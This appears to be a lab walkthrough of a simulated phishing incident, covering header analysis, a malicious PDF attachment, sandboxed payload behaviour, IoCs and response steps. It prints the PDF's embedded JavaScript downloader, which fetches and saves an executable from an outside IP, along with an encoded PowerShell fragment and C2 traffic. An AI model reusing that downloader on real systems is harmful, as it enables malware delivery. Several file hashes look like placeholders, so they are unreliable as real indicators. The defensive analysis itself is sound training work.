# Incident Response Walkthrough: Phishing Email Analysis

**Analyst:** laz87  
**Date:** October 2025  
**Source:** TryHackMe Room — "Phishing Email Analysis"  
**Environment:** Isolated home lab

---

## Executive Summary

This walkthrough documents the analysis of a simulated phishing email incident. The exercise involved examining email headers, analyzing malicious attachments, extracting Indicators of Compromise (IoCs), and producing an incident response report. The goal was to practice the full incident response lifecycle: detection, analysis, containment, eradication, and recovery.

---

## 1. Incident Detection

### 1.1 Initial Report

**Reported by:** IT Helpdesk  
**Date:** 2025-10-15  
**Description:** An employee received an email claiming to be from "HR Department" with an attachment titled "Salary_Review_2025.pdf". The employee suspected it was suspicious due to the urgent tone and unexpected nature.

### 1.2 Triage

| Field | Value |
|-------|-------|
| **From:** | `hr-updates@s3cur1ty-training.com` |
| **To:** | `employee@company.com` |
| **Subject:** | URGENT: 2025 Salary Review — Action Required |
| **Attachment:** | `Salary_Review_2025.pdf` (245 KB) |
| **Received:** | 2025-10-15 09:23:41 EAT |

**Initial assessment:** Sender domain does not match the organization's domain. Attachment is unexpected. Escalated for analysis.

---

## 2. Email Header Analysis

### 2.1 Key Findings

```
Return-Path: <hr-updates@s3cur1ty-training.com>
Received: from mail.s3cur1ty-training.com (185.220.101.42)
Date: Wed, 15 Oct 2025 09:23:41 +0300
Message-ID: <20251015092341.4F2A@s3cur1ty-training.com>
X-Mailer: PHPMailer 6.5.0
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="boundary123"
```

### 2.2 Red Flags

| Indicator | Finding | Risk |
|-----------|---------|------|
| **Sender domain** | `s3cur1ty-training.com` ≠ company domain | 🔴 High |
| **Return path** | Mismatched with display name | 🔴 High |
| **Source IP** | `185.220.101.42` — Tor exit node (known) | 🔴 High |
| **X-Mailer** | PHPMailer — automated sending tool | 🟡 Medium |
| **SPF/DKIM** | Not present or failed | 🟠 High |

### 2.3 IP Reputation Check

```bash
# Whois lookup
whois 185.220.101.42
# Result: Registered to Tor Project, known exit node

# VirusTotal check
# 185.220.101.42: 45/92 security vendors flagged as malicious
```

---

## 3. Attachment Analysis

### 3.1 Static Analysis

```bash
# File type identification
file Salary_Review_2025.pdf
# Output: PDF document, version 1.7

# Hash calculation
sha256sum Salary_Review_2025.pdf
# Output: a3f2b8c9d1e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0

# Strings extraction
strings Salary_Review_2025.pdf | grep -E "(http|cmd|powershell|exec)"
# Found: http://185.220.101.42:8080/payload.exe
# Found: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
```

### 3.2 PDF Structure Analysis

```bash
# Check for JavaScript in PDF
pdfid Salary_Review_2025.pdf

# Results:
# PDF: 1
# JavaScript: 1        ← Suspicious
# Objects: 28
# Suspected OCERun: 0
# GetContents: 0
# Import: 0
# Launch: 1            ← Suspicious
```

### 3.3 Embedded JavaScript

Extracted from the PDF:
```javascript
var url = "http://185.220.101.42:8080/payload.exe";
var obj = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
obj.Open("GET", url, false);
obj.Send();
var stream = new ActiveXObject("ADODB.Stream");
stream.Type = 1;
stream.Open();
stream.Write(obj.ResponseBody);
stream.SaveToFile("C:\\Users\\Public\\salary_update.exe", 2);
```

**Analysis:** The PDF contains embedded JavaScript that downloads and saves a malicious executable when opened. This is a common technique to bypass email security filters.

---

## 4. Malware Analysis (Payload)

### 4.1 Payload Download & Hash

```
File: payload.exe
Size: 1,245,184 bytes
MD5: 7d8a5b2c3e1f4a6b9c0d2e3f4a5b6c7d
SHA256: b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5
```

### 4.2 Static Analysis

```bash
# PE file info
pefile payload.exe
# Entry point: 0x1400010A0
# Compiling: Microsoft Visual C++ 19.29
# Imports: kernel32.dll, user32.dll, wininet.dll, advapi32.dll

# Suspicious imports:
# - InternetOpenA (wininet.dll) — HTTP requests
# - InternetReadFile (wininet.dll) — Download data
# - RegSetValueExA (advapi32.dll) — Registry modification
# - CreateRemoteThread (kernel32.dll) — Process injection
```

### 4.3 Dynamic Analysis (Sandbox)

**Environment:** Windows 10 sandbox, isolated network, API monitoring

**Behavior observed:**
1. **Process creation:** `payload.exe` → `cmd.exe /c whoami`
2. **Network activity:** C2 callback to `185.220.101.42:443` (HTTPS)
3. **Registry modification:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → Persistence
4. **File drops:** `C:\Users\Public\Documents\update.dat` (encrypted data)
5. **Lateral movement:** Attempted SMB connection to `192.168.1.1` (gateway)

### 4.4 C2 Communication

```
POST /api/check-in HTTP/1.1
Host: 185.220.101.42
Content-Type: application/json

{"host":"DESKTOP-ABC123","user":"employee","os":"Windows 10","ip":"192.168.1.100"}
```

**Response:**
```json
{"task":"exfiltrate","target":"C:/Users/employee/Documents","method":"zip"}
```

---

## 5. Indicators of Compromise (IoCs)

### 5.1 Network IoCs

| Type | Value | Context |
|------|-------|---------|
| IP | `185.220.101.42` | C2 server, Tor exit node |
| Domain | `s3cur1ty-training.com` | Phishing sender |
| URL | `http://185.220.101.42:8080/payload.exe` | Malware download |
| URL | `https://185.220.101.42/api/check-in` | C2 callback |

### 5.2 File IoCs

| File | MD5 | SHA256 |
|------|-----|--------|
| `Salary_Review_2025.pdf` | `a3f2b8c9d1e4f5a6b7c8d9e0f1a2b3c4` | `a3f2b8c9d1e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0` |
| `payload.exe` | `7d8a5b2c3e1f4a6b9c0d2e3f4a5b6c7d` | `b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5` |

### 5.3 Host IoCs

| Type | Value |
|------|-------|
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\salary_update` |
| File path | `C:\Users\Public\salary_update.exe` |
| File path | `C:\Users\Public\Documents\update.dat` |
| Process | `cmd.exe /c whoami` (child of payload.exe) |

---

## 6. Incident Timeline

| Time (EAT) | Event |
|-------------|-------|
| 09:23:41 | Phishing email received by employee |
| 09:25:00 | Employee reported suspicious email to IT |
| 09:30:00 | IT helpdesk quarantined email, escalated to security |
| 09:45:00 | Security team began email header analysis |
| 10:00:00 | Attachment extracted and analyzed (static) |
| 10:15:00 | Embedded JavaScript identified in PDF |
| 10:30:00 | Payload downloaded in sandbox for analysis |
| 10:45:00 | C2 communication and behavior documented |
| 11:00:00 | IoCs extracted and shared with SOC |
| 11:15:00 | Containment actions initiated |

---

## 7. Containment & Eradication

### 7.1 Immediate Actions

1. **Email quarantine:** Blocked all emails from `s3cur1ty-training.com` organization-wide
2. **Firewall block:** Added `185.220.101.42` to outbound blocklist
3. **Endpoint scan:** Ran antivirus scan on employee's workstation — no infection found (email was reported before opening)
4. **IoC hunting:** Searched all endpoints for file hashes and registry keys — no matches found

### 7.2 Preventive Measures

1. **Email filter update:** Added sender domain and IP to spam blocklist
2. **PDF security:** Configured email gateway to strip JavaScript from PDFs
3. **User awareness:** Sent security advisory about the phishing campaign
4. **Monitoring:** Added C2 URL to SIEM alert rules

---

## 8. Lessons Learned

1. **Employee vigilance:** The employee correctly identified and reported the suspicious email — security awareness training is working.
2. **Email filtering:** SPF/DKIM/DMARC should be enforced to prevent domain spoofing.
3. **Attachment scanning:** PDFs with embedded JavaScript should be automatically flagged.
4. **Incident response:** The team responded within 7 minutes of the report — good detection-to-response time.

---

## 9. Recommendations

### Short-term
- [ ] Implement DMARC policy (`p=reject`) for the organization's domain
- [ ] Deploy advanced email security gateway with sandboxing
- [ ] Conduct phishing simulation exercise for all employees
- [ ] Update endpoint detection and response (EDR) signatures

### Long-term
- [ ] Implement network segmentation to limit lateral movement
- [ ] Deploy a SIEM with behavioral analytics
- [ ] Establish a formal incident response plan (IRP)
- [ ] Conduct tabletop exercises quarterly

---

## 10. References

- [MITRE ATT&CK: T1566.001 — Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)
- [MITRE ATT&CK: T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [NIST SP 800-61r2: Computer Security Incident Handling Guide](https://www.nist.gov/publications/computer-security-incident-handling-guide)
- [TryHackMe: Phishing Email Analysis Room](https://tryhackme.com)

---

*This walkthrough was completed in a controlled lab environment for educational purposes.*
